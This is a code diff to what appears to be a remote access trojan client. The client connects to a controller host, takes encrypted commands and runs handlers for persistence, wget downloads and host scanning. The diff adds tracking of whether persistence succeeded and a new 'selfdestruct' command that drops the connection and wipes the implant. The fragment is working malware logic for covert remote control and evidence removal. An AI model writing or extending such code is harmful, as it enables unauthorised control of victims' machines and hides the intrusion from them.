@@ -28,6 +28,8 @@ def main():
     conn.connect((HOST, PORT))
     client = common.Client(conn, HOST, 1)
 
+    persistence_applied = False
+
     while True:
         results = ''
         data = client.recvGCM()
@@ -70,6 +72,8 @@ def main():
 
         elif cmd == 'persistence':
             results = persistence.run(plat)
+            if 'unsuccessful' not in results:
+                persistence_applied = True
 
         elif cmd == 'wget':
             results = toolkit.wget(action)
@@ -82,6 +86,10 @@ def main():
 
         elif cmd == 'scan':
             results = scan.single_host(action)
+
+        elif cmd == 'selfdestruct':
+            conn.close()
+            toolkit.selfdestruct(plat, persistence_applied)
 
         client.sendGCM(results)
 
